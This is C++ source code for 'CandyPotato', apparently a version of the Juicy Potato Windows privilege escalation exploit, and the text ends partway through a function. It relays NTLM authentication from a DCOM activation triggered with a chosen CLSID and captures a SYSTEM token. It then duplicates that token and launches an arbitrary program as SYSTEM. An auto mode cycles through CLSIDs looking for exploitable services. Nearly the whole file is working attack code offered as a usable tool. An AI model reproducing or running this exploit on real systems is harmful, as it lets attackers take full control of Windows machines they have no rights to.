#include "stdafx.h"
#include "MSFRottenPotato.h"
#include "IStorageTrigger.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h> 
#include <UserEnv.h>
#include <assert.h>
#include <tchar.h>
#include <windows.h>
#include <aclapi.h>
#include <accctrl.h>
#include <stdio.h>
#include <assert.h>
#include <tchar.h>
#include <WinSafer.h>
#include <tlhelp32.h>
#include <future>
#include "Clock.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "userenv.lib")

// Enable DEBUG messages
BOOL DEBUG = FALSE;
int AutoJuicy(void);
void PrintCLSIDs(void);
PotatoAPI* CandySetup(wchar_t* clsId);
int CandyTrigger(PotatoAPI* api);
int CandyLoop(PotatoAPI* api, HANDLE* handle);
int Candy(HANDLE handle);
int Juicy(wchar_t*, BOOL);
wchar_t* olestr;
wchar_t* g_port;
wchar_t* rpcserver;
wchar_t* rpcport;
char dcom_port[12];
char dcom_ip[17];
const int MAX_SOCKET_TIMEOUT = 1;
int lastErrorLevel = 0;

static const char VERSION[] = "0.2";
BOOL TEST_mode = FALSE;
BOOL AUTO_mode = FALSE;
BOOL PRINT_mode = FALSE;
HANDLE elevated_token, duped_token;

int PotatoAPI::newConnection;
wchar_t* processtype = NULL;
wchar_t* processargs = NULL;
wchar_t* processname = NULL;
DWORD startType = 0x3;

struct PotatoAPIException : public std::exception
{
private:
	std::string errMesg;
	int errCode;
public:
	PotatoAPIException(const std::string& msg, int _errCode) {
		errMesg = msg;
		errCode = _errCode;
	}
	const char* what() const throw ()
	{
		return errMesg.c_str();
	}
	int getErrorCode() const throw ()
	{
		return errCode;
	}
};

int IsTokenSystem(HANDLE tok)
{
	DWORD Size, UserSize, DomainSize;
	SID* sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER* User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;

	User = (TOKEN_USER*)malloc(Size);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID*)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof * UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);
	if(!AUTO_mode){
		printf("%S;%S\\%S\n", olestr, DomainName, UserName);
	}
	if (!_wcsicmp(UserName, L"SYSTEM"))
		return 1;

	return 0;
}

void usage()
{
	printf("CandyPotato v%s \n\n", VERSION);

	printf("Mandatory args: \n"
		"-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both\n"
		"-p <program>: program to launch\n"
	);

	printf("\n\n");
	printf("Optional args: \n"
		"-l <port>: COM server listen port\n"
		"-m <ip>: COM server listen address (default 127.0.0.1)\n"
		"-a <argument>: command line argument to pass to program (default NULL)\n"
		"-k <ip>: RPC server ip address (default 127.0.0.1)\n"
		"-n <port>: RPC server listen port (default 135)\n"
		"-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})\n"
		"-z only test CLSID and print token's user\n"
		"-x automatically identifies suitable CLSIDs and attempt exploitation\n"
		"-s <start-type> [1-4](default 3:[MANUAL])\n"
		"-Q print available CLSIDs and exit\n"
	);
}

PotatoAPI::PotatoAPI() {
	ThreadMap tm_ = ThreadMap();
	comSendQ = new BlockingQueue<char*>();
	rpcSendQ = new BlockingQueue<char*>();
	newConnection = 0;
	negotiator = new LocalNegotiator();
	return;
}

void PotatoAPI::Destroy() {
	delete(this->comSendQ);
	delete(this->rpcSendQ); 
	delete(this->negotiator);
	delete(this);
	return;
}

int PotatoAPI::waitForAllThreads() {
	const int c = tm_.size();
	HANDLE* threads = new HANDLE[c];
	int i = 0;
	for (std::pair<DWORD, HANDLE> thread : tm_)
	{
		*(threads+i) = thread.second;
		i++;
	}
	DWORD result = WaitForMultipleObjects((DWORD)2, threads, false, INFINITE);
	return (int)result;
}

PotatoAPI::ThreadMap PotatoAPI::getAllThreads() {
	return tm_;
}

void PotatoAPI::killAllThreads() {
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (h != INVALID_HANDLE_VALUE) {
		THREADENTRY32 te;
		te.dwSize = sizeof(te);
		if (Thread32First(h, &te)) {
			do {
				if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) +
					sizeof(te.th32OwnerProcessID)) {
					printf("Process 0x%04x Thread 0x%04x\n",
						te.th32OwnerProcessID, te.th32ThreadID);
				}
				te.dwSize = sizeof(te);
			} while (Thread32Next(h, &te));
		}
		CloseHandle(h);
	}
}

void PotatoAPI::killThreadMap()
{
	for (std::pair<DWORD, HANDLE> thread : tm_)
	{
		try
		{
			TerminateThread(thread.second, 0);
			tm_.erase(thread.first);
		}
		catch (...) 
		{
			printf("\n%s\n", "[x] ---- Error killing threads ---- [x]");
		}
	}
	tm_.clear();
}

void PotatoAPI::clearThreadMap() {
	for (std::pair<DWORD, HANDLE> thread : tm_)
	{
		tm_.erase(thread.first);
	}
	tm_.clear();
}

DWORD PotatoAPI::startRPCConnectionThread() {
	DWORD ThreadID;
	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartRPCConnection, (void*)this, 0, &ThreadID);
	tm_[ThreadID] = t;
	CloseHandle(t);
	return ThreadID;
}

DWORD PotatoAPI::startCOMListenerThread() throw(...) {
	DWORD ThreadID;
	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartCOMListener, (void*)this, 0, &ThreadID);
	//WaitForSingleObject(t, 2000);
	tm_[ThreadID] = t;
	CloseHandle(t);
	return ThreadID;
}

DWORD WINAPI PotatoAPI::staticStartRPCConnection(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startRPCConnection();
}

DWORD WINAPI PotatoAPI::staticStartCOMListener(void* Param) throw(...) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startCOMListener();
	/*
	DWORD ret = -1;
	try {
		ret = This->startCOMListener();
	}
	catch (PotatoAPIException& e) {
		if (e.getErrorCode() == -19) {
			exit(-1);
		}
	}
	*/
}

int PotatoAPI::findNTLMBytes(char* bytes, int len) {
	//Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
	//The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
	//we can just return the index
	char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
	int pIdx = 0;
	int i;
	for (i = 0; i < len; i++) {
		if (bytes[i] == pattern[pIdx]) {
			pIdx = pIdx + 1;
			if (pIdx == 7) return (i - 6);
		}
		else {
			pIdx = 0;
		}
	}
	return -1;
}

int PotatoAPI::processNtlmBytes(char* bytes, int len) {
	int ntlmLoc = findNTLMBytes(bytes, len);
	if (ntlmLoc == -1) return -1;

	int messageType = bytes[ntlmLoc + 8];
	switch (messageType) {
	case 1:
		// NTLM type 1 message
		negotiator->handleType1(bytes + ntlmLoc, len - ntlmLoc);
		break;
	case 2:
		// NTLM type 2 message
		negotiator->handleType2(bytes + ntlmLoc, len - ntlmLoc);
		break;
	case 3:
		// NTLM type 3 message
		negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
		break;
	default:
		printf("Error - Unknown NTLM message type...");
		return -1;
		break;
	}
	return 0;
}

int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
	fd_set readSet = fd_set();
	FD_ZERO(&readSet);
	FD_SET(*ListenSocket, &readSet);
	timeval timeout;
	timeout.tv_sec = MAX_SOCKET_TIMEOUT;
	timeout.tv_usec = 0;
	int rc = select(*ListenSocket, &readSet, NULL, NULL, &timeout);
	if (rc == 1) {
		*ClientSocket = accept(*ListenSocket, NULL, NULL);
		return 1;
	}
	return 0;
}

void CandyDisclaimer() {
	printf("---------------------%-18sCandy Potato%-18s----------------------\n", "", "");
	printf("-- The Automatic version of CandyPotato has been designed to loop among available CLSIDs --\n");
	printf("-- exploiting the most suitable ones. Although the tool has been designed to take only   --\n");
	printf("-- suitable CLSIDs, there are surely possibilities to encounter unexploitable CLSIDs.    --\n");
	printf("-- Testing an unexploitable CLSID, the tool may hang for 2-4 minutes, but it won't stop, --\n");
	printf("-- eventually reaching a valid CLSID.%52s--\n", "");
	printf("\n");
	printf("-- To increase likelihood of a successful 'one-shot', it's possible to change startType  --\n");
	printf("-- to other values. The fault is 3, and target services which 'start= Manual'. This has  --\n");
	printf("-- proven to be the most successful group of targets.                                    --\n");
	printf("-- To change the default value, use the -s option:                                       --\n");
	printf("-- CandyPotato.exe -t * -p example.exe -l 1337 -x -s 2%35s--\n", "");
	printf("\n");
}

int PotatoAPI::triggerDCOM(void)
{
	Sleep(100); // Seems to increase stability
	int trash;
	trash = CoInitialize(nullptr);

	// Create IStorage object
	IStorage* stg = NULL;
	ILockBytes* lb = NULL;
	HRESULT res = NULL;
	
	res = CreateILockBytesOnHGlobal(NULL, true, &lb);
	
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	// Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	trash = CLSIDFromString(olestr, &clsid);
	CLSID tmp;

	// IUnknown IID
	trash = CLSIDFromString(OLESTR("{00000000-0000-0000-C000-000000000046}"), &tmp);
	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;

	// Call CoGetInstanceFromIStorage
	HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);
	delete(t);

	//CoUninitialize();
	fflush(stdout);
	return 0;
}

int PotatoAPI::startRPCConnection(void) {
	const int DEFAULT_BUFLEN = 4096;

	fflush(stdout);
	WSADATA wsaData;

	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;

	char* sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;
	
	if (DEBUG)
		printf("%s\n", "Initialise WinSock");
	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	char myhost[24];
	char myport[12];

	if (rpcserver != NULL) {
		memset(myhost, 0, 24);
		wcstombs(myhost, rpcserver, 24);
	}
	else {
		strcpy(myhost, "127.0.0.1");
	}

	if (rpcport != NULL) {
		memset(myport, 0, 12);
		wcstombs(myport, rpcport, 12);
	}
	else {
		strcpy(myport, "135");
	}

	iResult = getaddrinfo(myhost, myport, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}
		
		// Connect to server
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (DEBUG)
			printf("Connected Result: %d\n", iResult);

		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	// Send/Receive until the peer closes the connection
	fflush(stdout);

	do {
		//Monitor our sendQ until we have some data to send
		int* len = (int*)rpcSendQ->wait_pop();

		fflush(stdout);
		sendbuf = rpcSendQ->wait_pop();

		//Check if we should be opening a new socket before we send the data
		if (newConnection == 1) {
			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			int y = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			newConnection = 0;
		}

		iResult = send(ConnectSocket, sendbuf, *len, 0);
		if (iResult == SOCKET_ERROR) {
			printf("RPC -> send failed with error: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			ExitThread(-2);
			return 0;
		}

		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			comSendQ->push((char*)&iResult);
			comSendQ->push(recvbuf);
		}
		else if (iResult == 0) {
			printf("RPC-> Connection closed\n");
			closesocket(ConnectSocket);
			WSACleanup();
		}
		else {
			printf("RPC -> recv failed with error: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			ExitThread(-2);
			return 0;
		}
	} while (iResult > 0);
	
	if(DEBUG)
		printf("last iResult:%d\n", iResult);
	
	fflush(stdout);
	// cleanup
	iResult = shutdown(ConnectSocket, SD_SEND);
	closesocket(ConnectSocket);
	WSACleanup();
	return 0;
}

int PotatoAPI::startCOMListener(void) throw(...){
	int timeoutCatch = 0;
	int checkpoint = 0;
	const int DEFAULT_BUFLEN = 4096;
	WSADATA wsaData;
	int iResult;
	struct addrinfo* result = NULL;
	struct addrinfo hints;
	int iSendResult;
	char* sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		if(!AUTO_mode){
			printf("WSAStartup failed with error: %d\n", iResult);
		}
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	memset(dcom_port, 0, 12);
	wcstombs(dcom_port, g_port, 12);

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, dcom_port, &hints, &result);

	if (iResult != 0) {
		if (!AUTO_mode) {
			printf("getaddrinfo failed with error: %d\n", iResult);
		}
		WSACleanup();
		return 1;
	}
	
	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	DWORD optval = 1000;
	setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR|SO_RCVTIMEO, (const char*)&optval, sizeof(optval));

	if (ListenSocket == INVALID_SOCKET) {
		if (!AUTO_mode) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
		}
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}
	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);

	if (iResult == SOCKET_ERROR) {
		if (!AUTO_mode) {
			printf("bind failed with error: %d\n", WSAGetLastError());
		}
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN | SO_REUSEADDR);
	if (iResult == SOCKET_ERROR) {
		if (!AUTO_mode) {
			printf("listen failed with error: %d\n", WSAGetLastError());
		}
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	//---- non block socket server
	timeval timeout = { MAX_SOCKET_TIMEOUT, 0 };
	fd_set fds = fd_set();
	FD_ZERO(&fds);
	FD_SET(ListenSocket, &fds);

	int rc = select(ListenSocket + 1, &fds, NULL, NULL, &timeout);
	int desc_ready = rc;

	if ( rc <= 0) {
		if(DEBUG){
			printf("SELECT FAILED with error: %d\n", rc);
		}
		timeoutCatch = 1;
		shutdown(ClientSocket, SD_SEND);
		closesocket(ClientSocket);
		closesocket(ListenSocket);
		WSACleanup();
		return -1;
	}
	
	if (FD_ISSET(ListenSocket, &fds))
	{
		ClientSocket = accept(ListenSocket, NULL, NULL);
		setsockopt(ClientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&optval, sizeof(optval));

		if (ClientSocket == INVALID_SOCKET) {
			if (AUTO_mode) {
				printf("accept failed with error: %d\n", WSAGetLastError());
			}
			closesocket(ListenSocket);
			WSACleanup();
			return 1;
		}
	}

	//int ntlmLoc;
	checkpoint = 0;
	do {
		try {
			iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
			if (iResult > 0) {

				if (!TEST_mode && !AUTO_mode)
					printf("%s", ".");

				//check to see if the received packet has NTLM auth information
				processNtlmBytes(recvbuf, iResult);

				//Send all incoming packets to the WinRPC sockets "send queue" and wait for the WinRPC socket to put a packet into our "send queue"
				//put packet in winrpc_sendq
				rpcSendQ->push((char*)&iResult);
				rpcSendQ->push(recvbuf);

				//block and wait for a new item in our sendq
				int* len = (int*)comSendQ->wait_pop();
				sendbuf = comSendQ->wait_pop();

				//Check to see if this is a packet containing NTLM authentication information before sending
				processNtlmBytes(sendbuf, *len);

				//send the new packet sendbuf
				iSendResult = send(ClientSocket, sendbuf, *len, 0);

				if (iSendResult == SOCKET_ERROR) {
					if (!AUTO_mode) {
						printf("COM -> send failed with error: %d\n", WSAGetLastError());
					}
					throw new PotatoAPIException("COM->send failed", -11);

				}
				//Sometimes Windows likes to open a new connection instead of using the current one
				//Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
				newConnection = checkForNewConnection(&ListenSocket, &ClientSocket);
			}
			else if (iResult == 0) {
				//connection closing...
				if (timeoutCatch == 0) {
					shutdown(ClientSocket, SD_SEND);
					WSACleanup();
				}
				iResult = 1;
				throw PotatoAPIException("COM Listener: Error", -19);
			}
			else {
				if (DEBUG){
					printf("COM Listener checkpoint %d:RECV ERR:%d\n", ++checkpoint, WSAGetLastError());
				}
				if (!TEST_mode && !AUTO_mode) {
					printf("COM -> recv failed with error: %d\n", WSAGetLastError());
				}
				
				if(timeoutCatch == 1){
					throw PotatoAPIException("COM -> recv failed", -18);
				}
				shutdown(ClientSocket, SD_SEND);
				shutdown(ListenSocket, SD_SEND);
				closesocket(ClientSocket);
				closesocket(ListenSocket);
				WSACleanup();
				throw PotatoAPIException("COM -> recv failed", -18);
			}
		}
		catch (PotatoAPIException& e) {
			if(e.getErrorCode() == -19){
				lastErrorLevel = 1;
				return e.getErrorCode();
				//throw PotatoAPIException("COM -> recv failed", -19); --> Impossible to catch without pointer passing to main thread
			}
			break;
		}
	} while (iResult > 0);

	// shutdown the connection since we're done
	int iResult1 = shutdown(ListenSocket, SD_SEND);
	iResult = shutdown(ClientSocket, SD_SEND);

	if (iResult == SOCKET_ERROR || iResult1 == SOCKET_ERROR) {
		if (!AUTO_mode) {
			printf("shutdown failed with error: %d\n", WSAGetLastError());
		}
		closesocket(ListenSocket);
		closesocket(ClientSocket);
		WSACleanup();
		ExitThread(-1);
	}

	// cleanup
	closesocket(ListenSocket);
	closesocket(ClientSocket);
	WSACleanup();
	ExitThread(-99); // -99 = DEBUG value
	return 0; // Unused
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		if (DEBUG)
			printf("Priv Lookup FALSE\n");
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		if (DEBUG)
			printf("Priv Adjust FALSE\n");
		return FALSE;
	}
	return TRUE;
}


int wmain(int argc, wchar_t** argv)
{
	BOOL brute = FALSE;

	strcpy(dcom_ip, "127.0.0.1");
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 't':
			++argv;
			--argc;
			processtype = argv[1];
			break;

		case 'p':
			++argv;
			--argc;
			processname = argv[1];
			break;

		case 'l':
			++argv;
			--argc;
			g_port = argv[1];
			break;

		case 'c':
			++argv;
			--argc;
			olestr = argv[1];
			break;

		case 'a':
			++argv;
			--argc;
			processargs = argv[1];
			break;

		case 'm':
			++argv;
			--argc;
			memset(dcom_ip, 0, 17);
			wcstombs(dcom_ip, argv[1], wcslen(argv[1]));
			break;

		case 'h':
			usage();
			exit(100);
			break;

		case 'k':
			++argv;
			--argc;
			rpcserver = argv[1];
			break;

		case 'n':
			++argv;
			--argc;
			rpcport = argv[1];
			break;

		case 'z':
			TEST_mode = TRUE;
			break;

		case 'Q':
			PRINT_mode = TRUE;
			break;

		case 'x':
			AUTO_mode = TRUE;
			break;

		case 's':
			++argv;
			--argc;
			try {
				startType = wcstod(argv[1], _T('\0'));
				if (startType > 4 || startType < 0) {
					throw std::exception("StartType value out-of-range", ERROR_BAD_ARGUMENTS);
				}
			}
			catch(...){
				printf("[-] Wrong value for start-type: %ls\n", argv[1]);
				usage();
			}
			break;

		default:
			printf("[-] Wrong Argument: %ls\n", argv[1]);
			usage();
			exit(-1);
		}

		++argv;
		--argc;
	}

	if (PRINT_mode) {
		PrintCLSIDs();
		exit(0);
	}

	if (g_port == NULL)
	{
		g_port = L"10000";
	}

	if ((processtype == NULL || processname == NULL) && !TEST_mode)
	{
		usage();
		exit(-1);
	}
	
	if (AUTO_mode) {
		CandyDisclaimer();
		int ret;

		const wchar_t* cmd_args_p = L" /c start /B ";
		
		const wchar_t* cmd_args_delim = L" ";

		const int cmd_args_size = sizeof(cmd_args_p) + sizeof(processname) + sizeof(cmd_args_delim) + sizeof(processargs);
		wchar_t cmd_args[cmd_args_size];

		wcscpy(cmd_args, cmd_args_p);
		wcscat(cmd_args, processname);
		wcscat(cmd_args, cmd_args_delim);
		if (processargs != NULL){
			wcscat(cmd_args, processargs);
		}
		processname = L"C:\\Windows\\system32\\cmd.exe";
		processargs = cmd_args;

		try {
			ret = AutoJuicy();
		}
		catch (...) {
			exit(1);
		}
		exit(ret);
	}

	// Fallback to default BITS CLSID
	if (olestr == NULL)
		olestr = L"{4991d34b-80a1-4291-83b6-3328366b9097}";

	exit(Juicy(NULL, FALSE));
}

void PrintCLSIDs() {

	ClassIdLocator c = ClassIdLocator();
	c.setStartType(startType);

	std::vector<hotpot> clsidList = c.CollectAllCLSIDs();
	printf("[+] Number of CLSIDs: %d\n", (int)clsidList.size());
	size_t nclsids = clsidList.size();
	int digits = 0;
	while (nclsids) {
		nclsids /= 10;
		digits++;
	}
	std::string s = std::to_string(digits);
	nclsids = clsidList.size();

	char* fmt_p = "|  %.";
	const char* size = s.c_str();
	const char* fmt_s = "d/%d  |  %lS  |  %-32ls  |\n";

	const int fmt_size = sizeof(fmt_p) + sizeof(size) + sizeof(fmt_s);
	char fmt[fmt_size];

	strcpy(fmt, fmt_p);
	strcat(fmt, size);
	strcat(fmt, fmt_s);
	printf("|  %-5s  |  %-38s  |  %-32s  |\n", "ID", "CLSID", "Service");
	printf("|%s|\n", std::string(89, '=').c_str());;
	for (int i = 0; i < nclsids; i++) {
		wchar_t* clsId = _wcsdup(clsidList.at(i).clsid.c_str());
		printf(fmt, i + 1, nclsids, clsId, clsidList.at(i).service.c_str());
	}
	printf("%s\n", std::string(91, '=').c_str());;
	clsidList.clear();
	clsidList.shrink_to_fit();
	exit(0);
}

int AutoJuicy() {
	ClassIdLocator c = ClassIdLocator();
	c.setStartType(startType);

	std::vector<hotpot> clsidList = c.CollectAllCLSIDs();
	printf("[+] Number of CLSIDs: %d\n", (int)clsidList.size());
	if (clsidList.empty()) {
		printf("%s\n", "[-] Error: Auto Mode failed.");
		return 1;
	}

	size_t nclsids = clsidList.size();
	int digits = 0;
	while (nclsids) {
		nclsids /= 10;
		digits++;
	}
	std::string s = std::to_string(digits);
	nclsids = clsidList.size();

	const char* fmt_p = "  (%.";
	const char* size = s.c_str();
	const char* fmt_s = "d/%d) CLSID: %lS; Service: %ls --> ";

	const int fmt_size = sizeof(fmt_p) + sizeof(size) + sizeof(fmt_s);
	char fmt[fmt_size];

	strcpy(fmt, fmt_p);
	strcat(fmt, size);
	strcat(fmt, fmt_s);

	//printf("%s", fmt);
	Clock ct = Clock();
	ct.tic();
	for (int i = 0; i < nclsids; i++) {
		// Start Testing Phase
		TEST_mode = TRUE;


		wchar_t* clsId = _wcsdup(clsidList.at(i).clsid.c_str());
		printf(fmt, i + 1, nclsids, clsId, clsidList.at(i).service.c_str());
		int res = 0;

		
		/*
		try {
			printf("PotatoAPI DCOM Trigger\n");
			res = CandyTrigger(test);
		}
		catch (...) {
			res = 1;
			printf("[-] Exception! :(");

		}
		if (res != 0) {
			printf("[-TRIGGER]");
			free(clsId);
			continue;
		}
		*/
		PotatoAPI* test = nullptr;
		int limit = 1;
		res = 0;
		HANDLE system_token = NULL;
		ct.tic();
		while (res == 0)
		{
			if(DEBUG)
				printf("Resetting PotatoAPI\n");
			test = CandySetup(clsId);
			if (ct.toc() > 5) {
				ct.tic();
				lastErrorLevel = 1;
				break;
			}
			if(DEBUG)
				printf("PotatoAPI DCOM Trigger\n");
			res = CandyTrigger(test);
			if (DEBUG)
				printf("PotatoAPI Candy Loop\n");
			res = CandyLoop(test, &system_token);
			Sleep(500);
		
		}
		if (lastErrorLevel == 1) {
			lastErrorLevel--;
			printf("FAILURE\n");
			fflush(stdout);
			continue;
		}
		if (res == 1) {
			TEST_mode = FALSE;
			printf("SUCCESS\n    [>] Executing: %ls\n", processname);
			fflush(stdout);
			Candy(system_token);
			system_token = NULL;
			long iPort = _wtol(g_port);
			iPort++;
			std::wstring ws = std::to_wstring(iPort);

			const wchar_t* lWind{ ws.c_str() };
			g_port = _wcsdup(lWind);

			free(clsId);
			
			char option = (char)"a";
			printf("    [*] Program executed successfully, continue? [y|n]\n");

			while (tolower(option) != 'y' && tolower(option) != 'n') {
				printf("    (y|n)> ");    
				fflush(stdout);
				int ret = scanf(" %c", &option);
				fflush(stdin);
			} 
			if (option == 'n') {
				printf("[+] Exit by user\n");
				fflush(stdout);
				exit(0);
			}
			
			continue;
		}
		else {
			printf("FAILURE\n");
			fflush(stdout);
		}
		test->waitForAllThreads();
		test->Destroy();
	}
	printf("[+] CLSID List Exhausted");
	clsidList.clear();
	clsidList.shrink_to_fit();
	exit(0);
}

PotatoAPI* CandySetup(wchar_t* clsid) {
	PotatoAPI* test = new PotatoAPI();
	try{
		test->startCOMListenerThread();
	}
	catch (PotatoAPIException &e) {
		if (e.getErrorCode() == -19) {
			throw &e;
		}
	}
	if (clsid != NULL)
		olestr = clsid;

	if (!TEST_mode && !AUTO_mode)
		printf("Testing %S %S\n", olestr, g_port);

	test->startRPCConnectionThread();
	//test->waitForAllThreads();
	
	return test;
}

int CandyTrigger(PotatoAPI* test) {
	try 
	{
		test->triggerDCOM();
		return 0;
	}
	catch (...)
	{
		printf("Exception DCOM\n");
		return -1;
	}
}

int CandyLoop(PotatoAPI* test, HANDLE* tHandle) {
	
	if (test->negotiator->authResult != -1)
	{
		HANDLE hToken;
		TOKEN_PRIVILEGES tkp;
		SECURITY_DESCRIPTOR sdSecurityDescriptor;
		if (!TEST_mode && !AUTO_mode)
			printf("\n[+] authresult %d\n", test->negotiator->authResult);

		fflush(stdout);

		// Get a token for this process. 
		if (!OpenProcessToken(GetCurrentProcess(),
			TOKEN_ALL_ACCESS, &hToken))return 0;

		//enable privileges
		EnablePriv(hToken, SE_IMPERSONATE_NAME);
		EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
		
		HANDLE hProcessToken;
		OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,
			&hProcessToken);

		QuerySecurityContextToken(test->negotiator->phContext, &elevated_token);
		
		if (IsTokenSystem(elevated_token)) {
			tHandle = &elevated_token;
			return 1;
		}
		return 0;		
	}
	return 0;
}

int Candy(HANDLE pHandle) {
	int FAILURE = 1;
	int SUCCESS = 0;
	int result;
	PTOKEN_TYPE ptg;
	DWORD dwl = 0;

	GetTokenInformation(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
	if (!dwl)
		printf("\n[-] Error: Could not get token type %x\n", GetLastError());

	result = DuplicateTokenEx(elevated_token,
		TOKEN_ALL_ACCESS,
		NULL,
		SecurityImpersonation,
		TokenPrimary,
		&duped_token);


	GetTokenInformation(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
	if (!dwl)
		printf("\n[-] Error: Could not get token type %x\n", GetLastError());

	DWORD SessionId;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	SECURITY_ATTRIBUTES sa;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = L"winsta0\\default";

	DWORD sessionId = WTSGetActiveConsoleSessionId();

	fflush(stdout);
	wchar_t command[256];
	wcscpy(command, processname);

	if (processargs != NULL)
	{
		wcsncat(command, L" ", 1);
		wcsncat(command, processargs, wcslen(processargs));
	}

	if (*processtype == 't' || *processtype == '*')
	{
		//could be also the elevated_token 
		result = CreateProcessWithTokenW(duped_token,
			0,
			processname,
			command,
			NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
			NULL,
			NULL,
			&si,
			&pi);
